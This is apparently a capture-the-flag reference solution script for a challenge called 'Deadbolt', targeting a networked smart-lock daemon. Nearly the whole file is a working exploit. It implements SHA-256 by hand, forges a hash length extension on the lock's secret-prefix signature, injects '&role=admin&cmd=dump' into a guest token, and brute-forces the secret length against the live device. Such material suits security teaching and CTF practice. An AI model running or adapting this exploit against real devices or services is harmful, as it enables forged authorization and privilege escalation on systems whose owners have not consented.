#!/usr/bin/env python3
"""
Deadbolt reference solution.

Chain:
  1. Carve the flash image (binwalk / unsquashfs) -> rootfs with /usr/bin/lockd.
  2. Reverse the wire framing: 0xDB 0x01 | len[2] BE | payload xored with a
     keystream (k=0x5a; k=k*33+7).
  3. Reverse the protocol. On connect the lock sends a guest token it signed with
     sig = SHA256(secret || msg). The command handler authorizes anything whose
     signature checks out, and the field parser lets a later key override an
     earlier one ("last role wins").
  4. That signature is a raw secret-prefix MAC -> Hash Length Extension. Take the
     signed guest token and extend it with "&role=admin&cmd=dump" without knowing
     the secret. The secret's length is unknown, so brute the length online
     against the live nonce until the device coughs up the flag.

Nothing here is in the handout. The flag only exists on the live device.

Usage: python solve.py <host> <port>
"""
import socket, struct, sys

# --------------------------------------------------------------- SHA-256 core
_K = [
0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]
_MASK = 0xffffffff
def _rotr(x,n): return ((x>>n)|(x<<(32-n)))&_MASK

def _compress(state, block):
    w=list(struct.unpack(">16I", block))
    for i in range(16,64):
        s0=_rotr(w[i-15],7)^_rotr(w[i-15],18)^(w[i-15]>>3)
        s1=_rotr(w[i-2],17)^_rotr(w[i-2],19)^(w[i-2]>>10)
        w.append((w[i-16]+s0+w[i-7]+s1)&_MASK)
    a,b,c,d,e,f,g,h=state
    for i in range(64):
        S1=_rotr(e,6)^_rotr(e,11)^_rotr(e,25)
        ch=(e&f)^((~e)&g)
        t1=(h+S1+ch+_K[i]+w[i])&_MASK
        S0=_rotr(a,2)^_rotr(a,13)^_rotr(a,22)
        maj=(a&b)^(a&c)^(b&c)
        t2=(S0+maj)&_MASK
        h,g,f,e,d,c,b,a=g,f,e,(d+t1)&_MASK,c,b,a,(t1+t2)&_MASK
    return [(x+y)&_MASK for x,y in zip(state,[a,b,c,d,e,f,g,h])]

def _pad(msglen):
    p=b"\x80"+b"\x00"*((56-(msglen+1))%64)+struct.pack(">Q",msglen*8)
    return p

def sha256(data):
    st=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]
    msg=data+_pad(len(data))
    for i in range(0,len(msg),64): st=_compress(st,msg[i:i+64])
    return struct.pack(">8I",*st)

def length_extend(orig_hex, prefix_len, ext):
    """Given SHA256(secret||base)=orig_hex and len(secret||base)=prefix_len,
    return (glue, new_hex) for SHA256(secret||base||glue||ext)."""
    glue=_pad(prefix_len)
    st=list(struct.unpack(">8I", bytes.fromhex(orig_hex)))
    total=prefix_len+len(glue)                       # bytes already hashed
    msg=ext+_pad(total+len(ext))
    for i in range(0,len(msg),64): st=_compress(st,msg[i:i+64])
    return glue, struct.pack(">8I",*st).hex()

# --------------------------------------------------------------- wire framing
def _mask(b):
    out=bytearray(b); k=0x5a
    for i in range(len(out)):
        out[i]^=k; k=(k*33+7)&0xff
    return bytes(out)

def send_frame(s, payload):
    s.sendall(b"\xdb\x01"+struct.pack(">H",len(payload))+_mask(payload))

def recv_all(s,n):
    buf=b""
    while len(buf)<n:
        d=s.recv(n-len(buf))
        if not d: raise EOFError
        buf+=d
    return buf

def recv_frame(s):
    hdr=recv_all(s,4)
    assert hdr[0]==0xDB and hdr[1]==0x01, "bad magic %r"%hdr[:2]
    n=(hdr[2]<<8)|hdr[3]
    return _mask(recv_all(s,n)) if n else b""

# --------------------------------------------------------------- attack
def attack(host, port):
    for slen in range(1, 64):                        # brute the secret length
        s=socket.create_connection((host,port),timeout=5)
        hello=recv_frame(s)
        sp=hello.rfind(b"&sig=")
        base=hello[:sp]
        sig=hello[sp+5:].decode()
        ext=b"&role=admin&cmd=dump"
        glue,newsig=length_extend(sig, slen+len(base), ext)
        payload=base+glue+ext+b"&sig="+newsig.encode()
        send_frame(s, payload)
        resp=recv_frame(s)
        s.close()
        if b"vault=" in resp:
            flag=resp.split(b"vault=",1)[1].split(b"&",1)[0].decode(errors="replace")
            print("[+] secret length = %d" % slen)
            print("[+] flag:", flag)
            return flag
    print("[-] no length in range worked")
    return None

if __name__=="__main__":
    host=sys.argv[1] if len(sys.argv)>1 else "127.0.0.1"
    port=int(sys.argv[2]) if len(sys.argv)>2 else 6000
    # self-test the SHA-256 against hashlib
    import hashlib
    assert sha256(b"deadbolt")==hashlib.sha256(b"deadbolt").digest(), "sha256 mismatch"
    attack(host, port)
